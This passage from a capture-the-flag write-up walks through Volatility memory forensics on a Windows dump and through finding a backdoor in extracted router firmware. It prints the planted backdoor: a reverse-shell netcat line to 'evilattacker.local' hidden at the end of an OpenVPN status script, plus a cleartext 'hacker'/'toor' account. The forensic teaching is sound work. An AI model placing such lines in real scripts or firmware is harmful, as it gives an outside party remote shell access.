Virtual            Physical           Name
------------------ ------------------ ----
0xfffff8a004d64010 0x000000002311d010 \SystemRoot\System32\Config\DEFAULT
0xfffff8a00000f010 0x000000002719a010 [no name]
0xfffff8a000024010 0x00000000270a5010 \REGISTRY\MACHINE\SYSTEM
0xfffff8a0000531f0 0x00000000271d41f0 \REGISTRY\MACHINE\HARDWARE
0xfffff8a000534410 0x0000000024038410 \Device\HarddiskVolume1\Boot\BCD
0xfffff8a000549010 0x0000000023ff8010 \SystemRoot\System32\Config\SOFTWARE
0xfffff8a000d21010 0x0000000021127010 \SystemRoot\System32\Config\SECURITY
0xfffff8a000d93010 0x0000000018bff010 \SystemRoot\System32\Config\SAM
0xfffff8a000e06010 0x00000000185ff010 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT
0xfffff8a000e98010 0x0000000017f08010 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT
0xfffff8a0010c6010 0x0000000010ce9010 \??\C:\Users\sshd_server\ntuser.dat
0xfffff8a001152010 0x00000000101b7010 \??\C:\Users\sshd_server\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a0011cf010 0x000000000f764010 \??\C:\System Volume Information\Syscache.hve
0xfffff8a0014c0010 0x00000000309e3010 \??\C:\Users\CTF-User-Admin\AppData\Local\Microsoft\Windows\UsrClass.dat
0xfffff8a001a6b410 0x0000000035afa410 \??\C:\Users\CTF-User-Admin\ntuser.dat
```

Our key exists under `\REGISTRY\MACHINE\SYSTEM` so let's grab that virtual address and look up our registry key:

```bash
➜ volatility -f memdump.mem --profile=Win7SP1x64 printkey -o 0xfffff8a000024010 -K 'ControlSet001\Control\ComputerName\ComputerName'

Volatility Foundation Volatility Framework 2.6
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2019-07-26 19:15:19 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) CTF-WIN-7
```

We enter our __CTF-WIN-7__ flag and proceed.

Oh, I suppose you could also look at the `consoles` output again:

```bash
Screen 0x211100 X:80 Y:300
Dump:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\CTF-User-Admin>whoami
ctf-win-7\ctf-user-admin

C:\Users\CTF-User-Admin>
**************************************************
ConsoleProcess: conhost.exe Pid: 1760
```

`ctf-win-7\ctf-user-admin` tells us the machine's hostname is `ctf-win-7`.

### Forensics 101 (part 4)

Points: 10

> There is an odd process running, what is the process name?

Again let's refer to Volatility's [command reference][volatility commands]. The [`pslist` command][pslist] lists the processes of the system.

![Volatility pslist][]

Hmm, __flag449.exe__ seems odd.

Bonus fact: you can discover this through the `consoles` command as well. If you scroll up to where we dump out the recent console activity, you'll see this snippet:

```bash
C:\Users\CTF-User-Admin>
**************************************************
ConsoleProcess: conhost.exe Pid: 1760
Console: 0xffdd6200 CommandHistorySize: 50
HistoryBufferCount: 1 HistoryBufferMax: 4
OriginalTitle: C:\Users\CTF-User-Admin\Desktop\flag449.exe
Title: C:\Users\CTF-User-Admin\Desktop\flag449.exe
AttachedProcess: flag449.exe Pid: 2368 Handle: 0x60
----
CommandHistory: 0x21ecb0 Application: flag449.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
----
```

We can see that this executable was recently invoked, no doubt leading to the running process captured in the memory dump.

### Forensics 101 (part 5)

Points: 10

> What was one of the last commands run from the command line?

This is another invocation of `consoles`:

```bash
➜ volatility --profile=Win7SP1x64 -f memdump.mem consoles

Volatility Foundation Volatility Framework 2.6
**************************************************
ConsoleProcess: conhost.exe Pid: 1612
Console: 0xffdd6200 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: -
Title: -
----
CommandHistory: 0x2515a0 Application: - Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x58
----
CommandHistory: 0x2512f0 Application: cygrunsrv.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
Screen 0x26fdd0 X:80 Y:300
Dump:

**************************************************
ConsoleProcess: conhost.exe Pid: 744
Console: 0xffdd6200 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: Administrator: C:\Windows\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 1940 Handle: 0x60
----
CommandHistory: 0x22ef70 Application: whoami.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x22ec50 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 1 LastAdded: 0 LastDisplayed: 0
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
Cmd #0 at 0x22d810: whoami
----
Screen 0x211100 X:80 Y:300
Dump:
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\CTF-User-Admin>whoami
ctf-win-7\ctf-user-admin

C:\Users\CTF-User-Admin>
**************************************************
ConsoleProcess: conhost.exe Pid: 1760
Console: 0xffdd6200 CommandHistorySize: 50
HistoryBufferCount: 1 HistoryBufferMax: 4
OriginalTitle: C:\Users\CTF-User-Admin\Desktop\flag449.exe
Title: C:\Users\CTF-User-Admin\Desktop\flag449.exe
AttachedProcess: flag449.exe Pid: 2368 Handle: 0x60
----
CommandHistory: 0x21ecb0 Application: flag449.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x60
----
Screen 0x201170 X:80 Y:300
Dump:
Please Enter Password:
```

We see that __whoami__ was last invoked on the command line.

### Forensics 101 (part 6)

Points: 10

> What is the IP address of the host?

I admit I guessed with this one until I got the right IP address. There is definitely a "right" way to solve this, and I welcome your comments if you would like to guide me to the light. Here is how I solved it.

Volatility has [several networking commands][volatility networking]. Many are only valid for older versions of Windows. In fact, the only command listed that would run on the `Win7SP1x64` profile was [`netscan`][netscan]. Netscan scans for network artifacts and "finds TCP endpoints, TCP listeners, UDP endpoints, and UDP listeners."

Here is some of the output of `netscan`:

![Volatility netscan][]

I looked for full local IP addresses, like in the line:

```bash
0x3ddba210         UDPv4    192.168.88.15:1900             *:*                                   1152     svchost.exe    2019-07-26 19:25:38 UTC+0000
```

I don't remember if that was the correct IP address. I entered several IP addresses from the output of this command until one of them solved the challenge.

...

![Hackercat][]

Hey, I got the points. That's all that matters.

### Firmware Hacked (part 1)

Points: 30

> Someone altered this firmware. Find the flag and submit it.

Ok, now we are on to the second set of forensics challenges. We are provided a `Firmware` file and, indeed, we can confirm it is firmware.

```bash
➜ file Firmware

Firmware: data
```

Neat. Searching the internet, I learned [`binwalk`][binwalk] is a firmware analysis tool that can help us.

![binwalk command][]

`binwalk` analyzes our firmware and gives us some information on what we're working with. Specifically, we see that this is a `Squashfs` filesystem, so let's have binwalk extract out that file system:

```bash
binwalk -e ./Firmware
```

![binwalk extracted][]

There is a LOT in here. Time to hunt. We're looking for a recently modified file, so let's organize our file system by recently modified files. I ran this find command without the `-newermt` flag and then ran this more precise command with a date somewhere near the most recent dates that I saw.

```bash
➜ find _Firmware.extracted -type f -newermt 2019-08-07 -printf '$TY-%Tm-%Td %TT %p\n' | sort
$TY-08-20 11:32:30.0000000000 _Firmware.extracted/authorize
$TY-08-20 11:32:30.0000000000 _Firmware.extracted/squashfs-root/etc/freeradius/mods-config/files/authorize
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/addpppoeconnected
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/addpppoetime
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/adjtimex
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/always
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/arp
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/arping
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/ash
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/autokill_wiviz
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/awk
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/basename
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/bash
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/beep
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/blkid
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/bunzip2
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/cache_eap
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/cat
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chap
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chattr
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/check_ps
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/check_ses_led
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chgrp
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chilli
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chilli_opt
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chilli_query
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chilli_radconfig
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chilli_response
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chmod
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chown
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/chroot
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/clear
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/cmp
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/cp
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/cron.d
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/cut
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/date
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/dbclient
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/dc
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/dd
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/ddns_success
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/default
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/delpppoeconnected
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/detail
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/detail.log
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/df
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6c
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6c.conf
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6c-state
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/dhcp6s
...
```

This is just a snippet of the returned results. You can see I've formatted the files with the last modified timestamp on the left. Let me say that getting to this point was at least an hour of blind searching through the file system until I organized my thoughts well enough to execute that `find` command. Feeling smug, I notice an interesting looking file name at the top of the list: `_Firmware.extracted/authorize`.

```bash
➜ cat _Firmware.extracted/authorize                

...

#
# Default for SLIP: dynamic IP address, SLIP mode.
#
#DEFAULT	Hint == "SLIP"
#	Framed-Protocol = SLIP

#
# Last default: rlogin to our main server.
#
#DEFAULT
#	Service-Type = Login-User,
#	Login-Service = Rlogin,
#	Login-IP-Host = shellbox.ispdomain.com

# #
# # Last default: shell on the local terminal server.
# #
# DEFAULT
# 	Service-Type = Administrative-User


# On no match, the user is denied access.

hacker    Cleartext-Password := "toor"
#########################################################
# You should add test accounts to the TOP of this file! #
# See the example user "bob" above.                     #
#########################################################
```

Well that definitely looks suspicious. However, if we look at the command we used to generate this list of modified files, you may notice I made a mistake. Let's try it again:

```bash
➜ find _Firmware.extracted -type f -newermt 2019-08-07 -printf '$TY-%Tm-%Td %TT %p\n' | sort -r

$TY-09-27 21:25:17.7186270680 _Firmware.extracted/CB2787.xz
$TY-09-27 21:25:17.7186270680 _Firmware.extracted/CB2787
$TY-09-27 21:25:17.7106270680 _Firmware.extracted/CB2309.xz
$TY-09-27 21:25:17.7106270680 _Firmware.extracted/CB2309
$TY-09-27 21:25:17.7066270670 _Firmware.extracted/CB20BF.xz
$TY-09-27 21:25:17.7066270670 _Firmware.extracted/CB20BF
$TY-09-27 21:25:17.4786270590 _Firmware.extracted/19C2AF.squashfs
$TY-09-27 21:25:16.3666270470 _Firmware.extracted/22CB.7z
$TY-09-27 21:25:16.0000000000 _Firmware.extracted/22CB
$TY-08-21 10:24:26.0000000000 _Firmware.extracted/squashfs-root/usr/sbin/httpd
$TY-08-21 10:24:26.0000000000 _Firmware.extracted/httpd
$TY-08-21 10:09:42.0000000000 _Firmware.extracted/var
$TY-08-21 10:09:42.0000000000 _Firmware.extracted/user
$TY-08-21 10:09:42.0000000000 _Firmware.extracted/smb
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/yes
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/xl2tpd.conf
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/xargs
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/write
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/whoami
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/which
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/wget
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/wc
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/watchdog
$TY-08-21 10:09:41.0000000000 _Firmware.extracted/watch
...
```

Ahh, we needed to reverse the sort to get the most recently modified files. It is unlikely that the `authorize` file is actually what we need since it was not recently modified. At the very least, I didn't see anything that screamed "flag." Now we have a more updated list of modified files. Wait...but no, those 9/27 files correspond to the day I re-ran this exercise when writing this blog (similarly, I had dates day-of when going through this exercise during Derbycon). I'm not getting accurate results from this.

At this point, a couple of hours into this challenge, I was very frustrated and running whatever querying commands I could think of.

```bash
grep --color -E -R Flag: ./_Firmware.extracted
```

![firmware cracked grep][]

Wait. Wa-oh. Damn it. Ok. That's __3805d35c-2440-4e0a-8dac-52245b6232ed__.

### Firmware Hacked (part 2)

Points: 30

> We think there's a backdoor, find the script. Identify and submit the domain.

This challenge frustrated me more than the previous one. I spent about 2-3 hours on this challenge and I was throwing commands at the file system. I know I need to find a script, so I collect a list of all scripts:

```bash
➜ find _Firmware.extracted -type f -name '*.sh' -exec ls -la '{}' \;

-rw-r--r-- 1 artis3n artis3n 990 Aug  6 03:54 _Firmware.extracted/cidrroute.sh
-rw-r--r-- 1 artis3n artis3n 542 Aug 28  2012 _Firmware.extracted/hotplug2-createmtd.sh
-rw-r--r-- 1 artis3n artis3n 1519 Aug  6 03:54 _Firmware.extracted/lease_update.sh
-rw-r--r-- 1 artis3n artis3n 934 Aug  6 03:54 _Firmware.extracted/openvpnlog.sh
-rw-r--r-- 1 artis3n artis3n 1866 Aug  6 03:54 _Firmware.extracted/openvpnstate.sh
-rw-r--r-- 1 artis3n artis3n 1981 Aug  6 03:54 _Firmware.extracted/openvpnstatus.sh
-rw-r--r-- 1 artis3n artis3n 2697 Aug  6 03:54 _Firmware.extracted/wl_snmpd.sh
-rw-r--r-- 1 artis3n artis3n 821 Aug  6 03:54 _Firmware.extracted/qmisierrastatusdetect.sh
-rw-r--r-- 1 artis3n artis3n 1475 Aug  6 03:54 _Firmware.extracted/qmistatus.sh
-rw-r--r-- 1 artis3n artis3n 2322 Aug  6 03:54 _Firmware.extracted/sierrastatus.sh
-rw-r--r-- 1 artis3n artis3n 972 Aug  6 03:54 _Firmware.extracted/pptpd_client.sh
-rw-r--r-- 1 artis3n artis3n 1950 Aug  6 03:54 _Firmware.extracted/proxywatchdog.sh
-rw-r--r-- 1 artis3n artis3n 119 Aug  6 03:54 _Firmware.extracted/schedulerb.sh
-rw-r--r-- 1 artis3n artis3n 617 Aug  6 03:54 _Firmware.extracted/wdswatchdog.sh
-rw-r--r-- 1 artis3n artis3n 1404 Aug  6 03:54 _Firmware.extracted/connect.sh
-rw-r--r-- 1 artis3n artis3n 6882 Aug  6 03:54 _Firmware.extracted/hso_connect.sh
-rw-r--r-- 1 artis3n artis3n 21 Aug 21 10:09 _Firmware.extracted/functions.sh
-rw-r--r-- 1 artis3n artis3n 190 Aug  6 03:54 _Firmware.extracted/vtysh_init.sh
-rw-r--r-- 1 artis3n artis3n 1215 Aug  6 03:54 _Firmware.extracted/call_splashd_check.sh
-rw-r--r-- 1 artis3n artis3n 3126 Aug  6 03:54 _Firmware.extracted/check_splashd.sh
-rw-r--r-- 1 artis3n artis3n 939 Aug  6 03:54 _Firmware.extracted/remote_settings.sh
-rw-r--r-- 1 artis3n artis3n 274 Aug  6 03:54 _Firmware.extracted/test_arp.sh
-rw-r--r-- 1 artis3n artis3n 124 Aug  6 03:54 _Firmware.extracted/traffic_input_count.sh
-rw-r--r-- 1 artis3n artis3n 123 Aug  6 03:54 _Firmware.extracted/traffic_output_count.sh
-rw-r--r-- 1 artis3n artis3n 1131 Aug  6 03:54 _Firmware.extracted/upgrade_check.sh
-rwxr-xr-x 1 artis3n artis3n 990 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/cidrroute.sh
-rwxr-xr-x 1 artis3n artis3n 156 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/connect.sh
-rwxr-xr-x 1 artis3n artis3n 821 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/qmisierrastatusdetect.sh
-rwxr-xr-x 1 artis3n artis3n 1475 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/qmistatus.sh
-rwxr-xr-x 1 artis3n artis3n 2322 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/comgt/sierrastatus.sh
-rwxr-xr-x 1 artis3n artis3n 972 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/pptpd_client.sh
-rwxr-xr-x 1 artis3n artis3n 1950 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/proxywatchdog.sh
-rwxr-xr-x 1 artis3n artis3n 119 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/schedulerb.sh
-rwxr-xr-x 1 artis3n artis3n 617 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/config/wdswatchdog.sh
-rwxr-xr-x 1 artis3n artis3n 542 Aug 28  2012 _Firmware.extracted/squashfs-root/etc/hotplug2-createmtd.sh
-rwxr-xr-x 1 artis3n artis3n 1404 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/hso/connect.sh
-rwxr-xr-x 1 artis3n artis3n 6882 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/hso/hso_connect.sh
-rwxr-xr-x 1 artis3n artis3n 1519 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/lease_update.sh
-rwxr-xr-x 1 artis3n artis3n 934 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/openvpnlog.sh
-rwxr-xr-x 1 artis3n artis3n 1866 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/openvpnstate.sh
-rwxr-xr-x 1 artis3n artis3n 1981 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/openvpnstatus.sh
-rwxr-xr-x 1 artis3n artis3n 2697 Aug  6 03:54 _Firmware.extracted/squashfs-root/etc/wl_snmpd.sh
-rwxr-xr-x 1 artis3n artis3n 190 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/bin/vtysh_init.sh
-rwxr-xr-x 1 artis3n artis3n 1215 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/call_splashd_check.sh
-rwxr-xr-x 1 artis3n artis3n 3126 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/check_splashd.sh
-rwxr-xr-x 1 artis3n artis3n 939 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/remote_settings.sh
-rwxr-xr-x 1 artis3n artis3n 274 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/test_arp.sh
-rwxr-xr-x 1 artis3n artis3n 124 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/traffic_input_count.sh
-rwxr-xr-x 1 artis3n artis3n 123 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/traffic_output_count.sh
-rwxr-xr-x 1 artis3n artis3n 1131 Aug  6 03:54 _Firmware.extracted/squashfs-root/usr/libexec/nocat/upgrade_check.sh
```

I started grepping through these files looking for something suspicious. I tried `grep`ing for `*com*`, `*org*`, `*net*`, etc. across these files, trying to suss out URLs. Nothing suspicious popped out. I ran `strings` on each script in turn and manually walked through the results, but there was too much noise. I was not getting anywhere with this challenge.

A colleague prompted me to think about how, as an attacker, I might try to exfiltrate my data from the backdoor. I looked again at my list of scripts.

```bash
_Firmware.extracted/openvpnlog.sh
_Firmware.extracted/openvpnstate.sh
_Firmware.extracted/openvpnstatus.sh 
```

![not sure if][]


```bash
➜ cat _Firmware.extracted/openvpnstatus.sh 

#!/bin/sh
if [ "$(nvram get openvpn_enable)" = "1" ]; then
PORT=`grep "^management " /tmp/openvpn/openvpn.conf | awk '{print $3}'`
if [ x${PORT} = x ]
then
	PORT=14
fi
        echo -n "<table><tr><td colspan=5>VPN Server Stats: "
	# STATS
        /bin/echo "load-stats" | /usr/bin/nc 127.0.0.1 ${PORT} | grep SUCCESS | \
        awk -F " " '{print $2}'| awk -F "," '{print $1 ", " $2 ", " $3}'
        echo -e "<hr/></td></tr>\n"
        # CLIENT LIST
        /bin/echo "status 2" | /usr/bin/nc 127.0.0.1 ${PORT} | \
        awk '/HEADER,CLIENT_LIST/{printline = 1; next} /HEADER,ROUTING_TABLE/ {printline = 0} printline' | \
        awk -F "," 'BEGIN{print "<tr><th>Client</th><th>Remote IP:Port</th><th>Bytes Received</th><th>Bytes Sent</th><th>Connected Since</th></tr>\n"}{
                printf "<tr><td>%s</td><td>%s</td><td>%d</td><td>%d</td><td>%s</td></tr>\n", $2, $3, $6, $7, $8;
        }
        END{print "\n<tr><td colspan=5><br></td></tr>\n<tr><td colspan=5>VPN Server Routing Table<hr/></td></tr>\n"}'
        # ROUTING TABLE
        /bin/echo "status 2" | /usr/bin/nc 127.0.0.1 ${PORT} | \
        awk '/HEADER,ROUTING_TABLE/{printline = 1; next} /GLOBAL_STATS/ {printline = 0} printline' | \
        awk -F "," 'BEGIN{print "<tr><th>Client</th><th>Virtual Address</th><th colspan=2>Real Address</th><th>Last Ref</th></tr>\n"}{
                printf "<tr><td>%s</td><td>%s</td><td colspan=2>%s</td><td>%s</td></tr>\n", $3, $2, $4, $5;
        }
        END{print "\n"}'
        echo -e "</table>\n<br>\n";
fi
if [ "$(nvram get openvpncl_enable)" = "1" ]; then
PORT=`grep "^management " /tmp/openvpncl/openvpn.conf | awk '{print $3}'`
if [ x${PORT} = x ]
then
	PORT=16
fi
/bin/echo "status 2" | /usr/bin/nc 127.0.0.1 ${PORT}  | grep "bytes" | awk -F "," 'BEGIN{print "<table><tr><td colspan=2>VPN Client Stats<hr></td></tr>"}{
        printf "<tr>\n<td>%s</td><td>%d</td>\n</tr>", $1, $2;
}
END{print "</table>"}'
fi
/usr/bin/nc -e /bin/sh  evilattacker.local 80
```

Well, all right then. __evilattacker.local__. In hindsight, I should have grep'd for usage of nefarious exfiltration tools, of which [netcat][] (`nc`) is popular. That would have sped up the time it took me to solve this significantly.

## Wrap-up

I would like to thank Bank of America's Global Information Security Team for putting together a great CTF. I really enjoyed it (aside from the times I wanted to bash my head against something hard) and I learned a lot from it. I look forward to taking these skills and improving on them in future CTFs.

[derbycon]: https://www.derbycon.com/
[hackers movie]: https://en.wikipedia.org/wiki/Hackers_(film)
[sneakers movie]: https://en.wikipedia.org/wiki/Sneakers_(1992_film)
[mr robot]: https://en.wikipedia.org/wiki/Mr._Robot
[mr robot dave kennedy]: https://www.youtube.com/watch?v=z-iDNGxkQgE
[mr robot hacking]: https://www.wired.com/2016/07/real-hackers-behind-mr-robot-get-right/
[default windows xp wallpaper]: https://www.google.com/search?q=default+wallpaper+windows+xp
[gizmodo newegg processors]: https://gizmodo.com/a-bizarre-story-newegg-fake-core-i7-processors-and-a-5488106
[ajit reeses]: https://dangerousminds.net/content/uploads/images/_framed/reesssocial-original-600-316.jpg?1513344060
[trevor]: https://www.csoonline.com/article/3227910/hackers-create-memorial-for-a-cockroach-named-trevor.html
[trevor google]: /img/derbycon_boa_ctf/osint_google.png
[trevor twitter]: /img/derbycon_boa_ctf/osint_twitter.png
[trevor gist]: /img/derbycon_boa_ctf/osint_gist.png
[trevor github profile]: /img/derbycon_boa_ctf/osint_github_profile.png
[trevor pastebin]: /img/derbycon_boa_ctf/osint_pastebin.png
[trevor facebook]: /img/derbycon_boa_ctf/osint_facebook.png
[nesting output]: /img/derbycon_boa_ctf/nesting_dolls.png
[nesting flag]: /img/derbycon_boa_ctf/nesting_flag.png
[gdb]: https://www.gnu.org/software/gdb/
[binary stackoverflow]: https://reverseengineering.stackexchange.com/a/3816
[cracking code 1]: /img/derbycon_boa_ctf/cracking_code_1.png
[cracking code 2]: /img/derbycon_boa_ctf/cracking_code_2.png
[cracking code 3]: /img/derbycon_boa_ctf/cracking_code_3.png
[cracking code 4]: /img/derbycon_boa_ctf/cracking_code_4.png
[challenge 3]: /img/derbycon_boa_ctf/Challenge_3.png
[challenge 3 transparent]: /img/derbycon_boa_ctf/Challenge_3_transparent.png
[challenge 3 enhanced]: /img/derbycon_boa_ctf/Challenge_3_enhance.png
[hackercat]: https://media.giphy.com/media/heIX5HfWgEYlW/giphy.gif
[hashcat]: https://github.com/hashcat/hashcat
[crack encrypted zip]: https://penguin-systems.com/node/10
[john]: https://github.com/magnumripper/JohnTheRipper
[john install]: https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/doc/INSTALL
[seclists]: https://github.com/danielmiessler/SecLists
[quipqiup]: https://quipqiup.com/
[cryptogram]: /img/derbycon_boa_ctf/cryptogram.png
[rtfm]: https://github.com/tanc7/hacking-books/blob/master/RTFM%20-%20Red%20Team%20Field%20Manual%20v3.pdf
[volatility]: https://github.com/volatilityfoundation/volatility
[volatility basics]: https://samsclass.info/121/proj/p4-Volatility.htm
[volatility sans]: https://blogs.sans.org/computer-forensics/files/2012/04/Memory-Forensics-Cheat-Sheet-v1_2.pdf
[volatility commands]: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference
[registry hives]: https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives
[hivelist]: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#hivelist
[hashdump]: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#hashdump
[printkey]: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#printkey
[pslist]: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#pslist
[netscan]: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#netscan
[volatility hashdump hashes]: /img/derbycon_boa_ctf/volatility_hashdump_hashcat_2.png
[ntlm bad]: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4
[ctfadmin hash]: /img/derbycon_boa_ctf/hashcat_ctfadmin.png
[hashcat potfile]: https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#what_is_a_potfile
[volatility pslist]: /img/derbycon_boa_ctf/volatility_pslist.png
[volatility networking]: https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#networking
[volatility netscan]: /img/derbycon_boa_ctf/volatility_netscan.png
[binwalk]: https://github.com/ReFirmLabs/binwalk
[binwalk command]: /img/derbycon_boa_ctf/binwalk.png
[binwalk extracted]: /img/derbycon_boa_ctf/binwalk_extracted.png
[firmware cracked grep]: /img/derbycon_boa_ctf/firmware_cracked_grep.png
[netcat]: https://null-byte.wonderhowto.com/how-to/hack-like-pro-use-netcat-swiss-army-knife-hacking-tools-0148657/
[not sure if]: /img/derbycon_boa_ctf/notsureif.jpg
